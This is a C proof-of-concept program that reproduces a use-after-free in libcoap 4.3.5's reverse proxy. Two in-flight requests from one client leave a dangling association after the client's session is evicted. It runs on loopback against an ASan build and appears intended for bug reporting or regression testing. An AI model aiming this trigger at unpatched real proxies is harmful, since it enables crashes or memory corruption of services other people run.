/*
 * Bug A: libcoap proxy use-after-free from incomplete association cleanup.
 *
 * When a client session is reaped, the library calls
 * coap_proxy_remove_association() to drop the proxy_req entries that point at
 * it. In v4.3.5 that function removes only the FIRST matching entry and then
 * breaks (coap_proxy.c:329-341). If one client had several requests in flight
 * to the same upstream, the remaining entries still point at the freed session,
 * so the upstream response dereferences a dangling pointer -> use-after-free.
 *
 * Unlike Bug B this needs an event handler registered (so the cleanup actually
 * runs) and two in-flight requests from the same client (so there is a second
 * entry left behind). Reproduces on 4.3.5; fixed on develop, where the
 * rewritten cleanup removes all matching entries.
 *
 * Build: make poc-bug-a      (links the ASan-instrumented 4.3.5 lib)
 * Run:   ./poc-bug-a         (expect an ASan heap-use-after-free report)
 */
#include <coap3/coap.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ORIGIN_PORT 5701
#define PROXY_PORT 5700

static coap_proxy_server_t rp_entry;
static coap_proxy_server_list_t reverse_proxy = {
    .entry = &rp_entry,
    .entry_count = 1,
    .type = COAP_PROXY_REVERSE,
    .track_client_session =
        0, /* shared proxy_entry keyed by upstream URI -> the bug */
};

static void origin_get(coap_resource_t *r COAP_UNUSED,
                       coap_session_t *s COAP_UNUSED,
                       const coap_pdu_t *req COAP_UNUSED,
                       const coap_string_t *q COAP_UNUSED, coap_pdu_t *resp) {
  coap_pdu_set_code(resp, COAP_RESPONSE_CODE_CONTENT);
  coap_add_data(resp, 13, (const uint8_t *)"upstream-data");
}

static void proxy_handler(coap_resource_t *res, coap_session_t *s,
                          const coap_pdu_t *req,
                          const coap_string_t *q COAP_UNUSED,
                          coap_pdu_t *resp) {
  if (!coap_proxy_forward_request(s, req, resp, res, NULL, &reverse_proxy))
    fprintf(stderr, "forward_request failed\n");
}

static coap_response_t proxy_response(coap_session_t *s,
                                      const coap_pdu_t *sent COAP_UNUSED,
                                      const coap_pdu_t *recv,
                                      const coap_mid_t id COAP_UNUSED) {
  return coap_proxy_forward_response(s, recv, NULL);
}

/* Registering any event handler is what makes the library run its proxy cleanup
 * on SERVER_SESSION_DEL. The body does not matter; it just has to exist. */
static int proxy_event(coap_session_t *s COAP_UNUSED,
                       coap_event_t ev COAP_UNUSED) {
  return 0;
}

static coap_context_t *make_server(uint16_t port) {
  coap_context_t *ctx = coap_new_context(NULL);
  coap_address_t a;
  coap_address_init(&a);
  a.addr.sin.sin_family = AF_INET;
  a.addr.sin.sin_port = htons(port);
  a.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  if (!coap_new_endpoint(ctx, &a, COAP_PROTO_UDP)) {
    fprintf(stderr, "endpoint on %u failed\n", port);
    exit(1);
  }

  return ctx;
}

static coap_session_t *make_client(coap_context_t *ctx, uint16_t dst_port) {
  coap_address_t d;
  coap_address_init(&d);
  d.addr.sin.sin_family = AF_INET;
  d.addr.sin.sin_port = htons(dst_port);
  d.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  return coap_new_client_session(ctx, NULL, &d, COAP_PROTO_UDP);
}

static void send_get(coap_session_t *s, const uint8_t *tok, size_t toklen) {
  coap_pdu_t *p = coap_new_pdu(COAP_MESSAGE_CON, COAP_REQUEST_CODE_GET, s);
  coap_add_token(p, toklen, tok);
  coap_add_option(p, COAP_OPTION_URI_PATH, 4, (const uint8_t *)"test");
  coap_send(s, p);
}

static void pump(int n, coap_context_t **ctxs) {
  for (int i = 0; i < n; i++)
    for (coap_context_t **c = ctxs; *c; c++)
      coap_io_process(*c, COAP_IO_NO_WAIT);
}

int main(void) {
  coap_startup();
  coap_set_log_level(COAP_LOG_WARN);

  static uint8_t uri_buf[] = "coap://127.0.0.1:5701";
  coap_uri_t uri;
  coap_split_uri(uri_buf, strlen((char *)uri_buf), &uri);
  rp_entry.uri = uri;

  coap_context_t *origin = make_server(ORIGIN_PORT);
  coap_resource_t *ores = coap_resource_init(coap_make_str_const("test"), 0);
  coap_register_request_handler(ores, COAP_REQUEST_GET, origin_get);
  coap_add_resource(origin, ores);

  coap_context_t *proxy = make_server(PROXY_PORT);
  coap_context_set_max_idle_sessions(proxy, 1);
  coap_add_resource(proxy, coap_resource_reverse_proxy_init(proxy_handler, 0));
  coap_register_response_handler(proxy, proxy_response);
  coap_register_event_handler(proxy, proxy_event); /* cleanup path is active */

  coap_context_t *client = coap_new_context(NULL);

  /*
   * 1. Client S sends TWO GETs to the same upstream. Both are forwarded and
   *    recorded as two proxy_req entries, both pointing at S. ORIGIN is held.
   */
  coap_session_t *S = make_client(client, PROXY_PORT);
  send_get(S, (const uint8_t *)"\x11\x11\x11\x11", 4);
  send_get(S, (const uint8_t *)"\x22\x22\x22\x22", 4);
  {
    coap_context_t *cp[] = {client, proxy, NULL};
    pump(12, cp);
  }

  /* 2. A second client connects, so S (idle) is evicted and freed. Cleanup runs
   *    but removes only the first entry; the second still points at freed S. */
  coap_session_t *S2 = make_client(client, PROXY_PORT);
  send_get(S2, (const uint8_t *)"\x33\x33\x33\x33", 4);
  {
    coap_context_t *cp[] = {client, proxy, NULL};
    pump(12, cp);
  }

  /*
   * 3. ORIGIN answers. Forwarding the surviving response derefs freed S -> UAF.
   */
  {
    coap_context_t *all[] = {origin, proxy, client, NULL};
    pump(40, all);
  }

  coap_free_context(client);
  coap_free_context(proxy);
  coap_free_context(origin);
  coap_cleanup();
  return 0;
}
